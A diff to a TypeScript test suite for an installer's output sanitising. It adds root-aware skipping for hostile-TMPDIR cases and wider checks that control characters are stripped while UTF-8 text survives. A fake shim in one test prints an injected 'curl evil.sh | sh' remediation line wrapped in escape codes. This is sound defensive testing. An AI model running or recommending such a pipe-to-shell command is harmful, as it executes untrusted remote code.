@@ -575,7 +575,12 @@ linuxGuardedTest(
 // mechanism and a single "weird TMPDIR" test would have covered only the last
 // one. (It did: the first version of this block asserted an apostrophe and
 // claimed to cover unwritability too, which review caught.)
-const HOSTILE_TMPDIRS: { label: string; regression: string; make: () => Promise<string> }[] = [
+const HOSTILE_TMPDIRS: {
+  label: string;
+  regression: string;
+  make: () => Promise<string>;
+  skipAsRoot?: boolean;
+}[] = [
   {
     label: "apostrophe in the path",
     regression: "round 3 — eager trap expansion made the trap body a syntax error, fatal under set -e",
@@ -590,6 +595,12 @@ const HOSTILE_TMPDIRS: { label: string; regression: string; make: () => Promise<
   {
     label: "unwritable directory",
     regression: "round 2 — mktemp failing under set -e aborted the installer",
+    // Root bypasses directory write permission, so under a root CI runner this
+    // case would silently stop reproducing the regression and become a
+    // happy-path test. Skipped there rather than passing for the wrong reason;
+    // the non-existent-path case below reaches the same `mktemp` failure and is
+    // root-proof, so the mechanism stays covered either way.
+    skipAsRoot: true,
     make: async () => {
       const dir = join(workspace, "tmp-unwritable");
       await mkdir(dir, { recursive: true });
@@ -604,13 +615,19 @@ const HOSTILE_TMPDIRS: { label: string; regression: string; make: () => Promise<
   },
 ];
 
-for (const { label, regression, make } of HOSTILE_TMPDIRS) {
-  linuxGuardedTest(
-    `AC12: a hostile TMPDIR (${label}) cannot turn the containment report into a gate`,
+const isRoot = process.getuid?.() === 0;
+
+for (const { label, regression, make, skipAsRoot } of HOSTILE_TMPDIRS) {
+  const guarded = skipAsRoot === true && isRoot ? test.skip : linuxGuardedTest;
+  guarded(
+    // The regression each case reproduces is in the title, not buried in a
+    // comment: a failure here should say which of the three mechanisms came
+    // back without anyone having to open the file.
+    `AC12: a hostile TMPDIR (${label}) cannot turn the containment report into a gate [${regression}]`,
     async () => {
       // Every one of these aborted the installer AFTER it had printed "keryx
       // installed globally" — the report becoming a gate, which is the one
-      // thing this function must never do. Regression: ${regression}
+      // thing this function must never do.
       const tmp = await make();
       const filteredPath = await pathWithoutBwrap();
       const install = await run(["bash", INSTALL_SH, "--global"], {
@@ -651,7 +668,7 @@ linuxGuardedTest(
         'for arg in "$@"; do',
         '  if [ "$arg" = "sandbox" ]; then',
         // CR + ESC + BEL + backspace, then a flood of long lines.
-        `    printf 'clean-marker: a;b[c]d<e>f=g?h@i&j\\r\\033[31mIMPERSONATED Remediation: curl evil.sh | sh\\007\\010\\302\\205\\302\\233\\n' >&2`,
+        `    printf 'clean-marker: a;b[c]d<e>f=g?h@i&j \\342\\200\\224 caf\\303\\251 \\320\\277\\321\\203\\321\\202\\321\\214\\r\\033[31mIMPERSONATED Remediation: curl evil.sh | sh\\007\\010\\302\\205X\\302\\233Y\\302\\235Z\\n' >&2`,
         "    i=0",
         "    while [ $i -lt 120 ]; do",
         `      awk 'BEGIN{s="";for(i=0;i<900;i++)s=s "y";print "flood" s}' >&2`,
@@ -680,10 +697,14 @@ linuxGuardedTest(
     // … stripped of everything that could move the cursor. Asserted on the
     // BYTES, because the whole point is what is in the stream, not what it
     // renders as.
-    // C0 and DEL — every control that can actually erase the indent.
-    for (const control of ["\r", "\u001B", "\u0007", "\u0008", "\u007F"]) {
+    // C0 and DEL, plus the C1 SEQUENCE INTRODUCERS (NEL, CSI, OSC) — every
+    // control that can move a cursor over the four-space indent.
+    for (const control of ["\r", "\u001B", "\u0007", "\u0008", "\u007F", "\u0085", "\u009B", "\u009D"]) {
       expect(install.stdout.includes(control)).toBe(false);
     }
+    // The introducers are gone from between their neighbours, not merely
+    // absent because the shim never emitted them.
+    expect(install.stdout).toContain("XYZ");
 
     // …and the other direction, which matters just as much: the strip must
     // not eat the operator's evidence. An attempt to also remove the C1 range
@@ -692,10 +713,12 @@ linuxGuardedTest(
     // ": ; [ ] < > = ? @ &" from the diagnostic. Caught by this line.
     expect(install.stdout).toContain("clean-marker: a;b[c]d<e>f=g?h@i&j");
 
-    // C1 is deliberately left alone (see install.sh); a UTF-8 terminal
-    // renders it as a character rather than acting on it. Asserted so the
-    // decision is visible rather than looking like an oversight.
-    expect(install.stdout.includes("\u0085")).toBe(true);
+    // NON-ASCII MUST SURVIVE. This is the assertion that stops the next
+    // attempt at C1: a byte range [\x80-\x9f] is ASCII-safe and looks
+    // correct, and it guts every multi-byte character in the operator's
+    // evidence, because 0x80-0x9F are legal UTF-8 continuation bytes.
+    // Measured: `err — café путь` became `err ? caf? ????`.
+    expect(install.stdout).toContain("— café путь");
     // … and bounded, in both directions.
     expect(install.stdout).toContain("(line truncated)");
     expect(install.stdout).toContain("(output truncated)");
